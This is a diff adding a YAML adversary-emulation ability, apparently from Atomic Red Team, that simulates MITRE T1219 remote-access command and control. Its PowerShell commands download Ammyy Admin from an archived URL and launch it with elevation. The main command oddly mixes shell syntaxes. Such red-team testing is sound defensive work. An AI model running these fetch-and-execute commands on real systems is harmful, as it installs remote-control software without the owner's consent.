@@ -1,0 +1,52 @@
+- id: 0ae9e327-3251-465a-a53b-485d4e3f58fa
+  name: Ammyy Admin Software Execution
+  description: "An adversary may attempt to trick the user into downloading Ammyy\
+    \ Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution,\
+    \ Ammyy Admin will be executed."
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe" -UseBasicParsing;
+          fi; Start-Process "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe"'
+        cleanup: Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1219
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      Ammyy_Admin_Path:
+        description: Path of Ammyy Admin executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe
+    dependencies:
+    - description: 'Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})
+
+        '
+      prereq_command: 'if (Test-Path "#{Ammyy_Admin_Path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe" -UseBasicParsing
+
+        '
+    technique_created: '2018-04-18T17:59:24.739Z'
+    atomic_guid: 0ae9e327-3251-465a-a53b-485d4e3f58fa
+    import_timestamp: '2025-06-24T11:15:05.497130Z'
